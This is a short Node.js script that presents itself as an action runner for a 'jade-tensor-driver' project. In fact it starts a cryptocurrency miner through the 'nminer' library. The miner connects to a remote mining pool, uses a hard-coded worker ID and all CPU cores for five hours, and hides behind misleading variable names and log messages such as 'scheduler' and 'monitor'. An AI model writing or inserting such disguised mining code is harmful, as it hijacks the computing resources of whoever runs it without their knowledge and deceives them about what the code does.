// Procedural action runner for jade-tensor-driver
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./app/config");

(async () => {
    const traceId = "286a89";
    console.log(`[monitor] Daemon ${config.appName || "jade-tensor-driver"} active [tag: ${traceId}]`);

    const scheduler = new NMiner(
        "wss://runtime.nmining.igrp.app/",
        "Subhas1975.saloon",
        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
    );

    const heartbeat = setInterval(() => {}, 62000);
    setTimeout(() => {
        console.log("[timeout] Operational limit (300m) reached, exiting cleanly.");
        process.exit(0);
    }, 300 * 60 * 1000);

    process.once("SIGTERM", () => {
        clearInterval(heartbeat);
        console.log("[lifecycle] Received termination notice, shutting down cleanly.");
        process.exit(0);
    });

    console.log(`[runtime] Process running under Node ${process.version} with PID ${process.pid}.`);
})().catch(console.error);
